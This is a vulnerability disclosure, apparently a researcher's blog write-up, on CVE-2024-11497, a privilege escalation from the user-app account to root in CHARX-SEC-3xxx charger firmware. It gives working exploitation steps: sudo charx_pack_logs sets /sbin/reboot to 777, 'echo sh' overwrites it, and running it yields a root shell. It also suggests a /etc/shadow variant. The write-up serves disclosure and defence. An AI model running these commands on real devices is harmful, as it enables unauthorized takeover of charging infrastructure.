### CVE-2024-11497 - Ancient Mistake Leads to Root Compromise and Second-Order Attack

Here’s a quick write-up on a vulnerability I recently discovered in the CHARX-SEC-3xxx firmware (version < 1.7.0). CHARX-SEC was one of the targets at Pwn2Own Automotive last year, and it'll appear again next week.

---

### Overview

The CHARX-SEC-3xxx devices allow users to deploy custom apps through `user-app`, a user account with limited access to some root-level commands via `sudo`. Here’s a look at the available commands:

```
ev3000:~$ sudo -l
User user-app may run the following commands on ev3000:
    (ALL) NOPASSWD: /usr/local/bin/charx_set_timezone, /usr/local/bin/charx_set_datetime,
        /usr/local/bin/charx_pack_logs, /etc/init.d/user-applications, /sbin/reboot, /usr/sbin/charx_system_update,
        /usr/sbin/charx_application_install, /usr/local/bin/charx_set_ip_address, /etc/init.d/charx-jupicore,
        /etc/init.d/charx-ocpp16-agent, /etc/init.d/charx-system-config-manager, /etc/init.d/charx-system-monitor,
        /etc/init.d/charx-controller-agent, /etc/init.d/charx-modbus-server, /etc/init.d/charx-modbus-agent,
        /etc/init.d/charx-cellular-network, /etc/init.d/charx-qca, /etc/init.d/charx-controller-agent,
        /usr/local/bin/charx_create_firewall_settings, /etc/init.d/firewall, /etc/init.d/charx-website,
        /etc/init.d/charx-update-agent, /sbin/reboot, /usr/local/bin/charx_rm_file, /sbin/ip
```

By exploiting a minor but critical flaw in one of these commands, an attacker could achieve root access, allowing full control over the device.

---

### Starting Point

At first, I went through the entire system, examining all SUID binaries in the hope of finding one to leverage for root access, but had no luck.

Next, I checked other services accessible by `user-app`. This user can perform some system configurations, but these require root privileges — meaning `user-app` can execute certain configurations with root access; sudoers is involved here. After checking sudoers, I found they were using the latest version, so even I have a one-day exploit wouldn’t be effective.

However, the extensive list of root-allowed commands for `user-app` caught my attention. After examining each, one command stood out: `/usr/local/bin/charx_pack_logs`.

---

### Vulnerability Details

In the script `/usr/local/bin/charx_pack_logs`, on line 56, the following command is executed:

```bash
...
CHMOD_LOGFILE="/bin/chmod 777"
...
$CHMOD_LOGFILE $filename_safe
...
```

This line sets file permissions to `777` (full read, write, and execute) on a specified file. Since my earliest days using Linux, I was taught to be cautious with `chmod 777`, using it only when absolutely necessary. What harm could this `chmod 777` permission cause?

---

### Exploitation

#### Go the hard way

Initially, I thought, "Let’s change permissions on an SUID binary for root access." However, setting `chmod 777` on these files clears their SUID bits, so no luck there. 

Next, I considered the sudoers configuration file (`/etc/sudoers`). I thought that changing its permissions might allow me to modify the configuration and run any command as `root`. But sudo is smart—it won’t run if `/etc/sudoers` has `777` permissions.

---

#### The Second-Order Attack

While taking a break, I had a realization: I could `chmod 777` any file on the `sudo` command list, modify it with a payload, and run it with root privileges. The vulnerability then becomes trivial to exploit! I decided to test this on `/sbin/reboot`, a binary I had already examined.

**Example: Changing Permissions on `/sbin/reboot`:**

1. Use the vulnerable `charx_pack_logs` script on `/sbin/reboot`:

    ```
    ev3000:~$ sudo /usr/local/bin/charx_pack_logs /sbin/reboot
    /usr/local/bin/charx_pack_logs: line 20: /var/log/mqtt-snapshot.json: Read-only file system
    /usr/local/bin/charx_pack_logs: line 23: /var/log/ps-snapshot: Read-only file system
    /usr/local/bin/charx_pack_logs: line 26: /var/log/df-snapshot: Read-only file system
    /usr/local/bin/charx_pack_logs: line 29: /var/log/data-listing: Read-only file system
    /usr/local/bin/charx_pack_logs: line 32: /var/log/data-file-space-usage-snapshot: Read-only file system
    /usr/local/bin/charx_pack_logs: line 35: /var/log/lsusb-snapshot: Read-only file system
    /usr/local/bin/charx_pack_logs: line 38: /var/log/scm-config-snapshot.ini: Read-only file system
    /usr/local/bin/charx_pack_logs: line 41: /var/log/devices-snapshot: Read-only file system
    /bin/tar: Removing leading `/' from member names
    /bin/tar: Removing leading `/' from hard link targets
    ```

2. The `/sbin/reboot` file now has `777` permissions, allowing anyone to read, write, and execute it.

3. The attacker can now overwrite `/sbin/reboot` to execute a shell instead:

    ```bash
    ev3000:~$ echo sh > /sbin/reboot
    ```

4. Running the modified `/sbin/reboot` file provides root access:

    ```bash
    ev3000:~$ id
    uid=2005(user-app) gid=2000(user-app) groups=2000(user-app)
    sh-4.4$ sudo reboot
    sh-4.4# id
    uid=0(root) gid=0(root) groups=0(root)
    sh-4.4#
    ```

#### Bonus

Another way to gain root permission is by using `chmod 777 /etc/shadow`, one of the most important files in a Linux system. Changing its permissions would allow me to modify the root password and gain direct access.

---

### Impact

This vulnerability allows an attacker to escalate privileges from the `user-app` user to root, granting them full control over the device.

---

### Conclusion

Sometimes, a break is all it takes to see things clearly.

---

### CVSS Score
CVSS 3.x Severity and Vector Strings:
Base Score: 8.8 
HIGHVector:  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
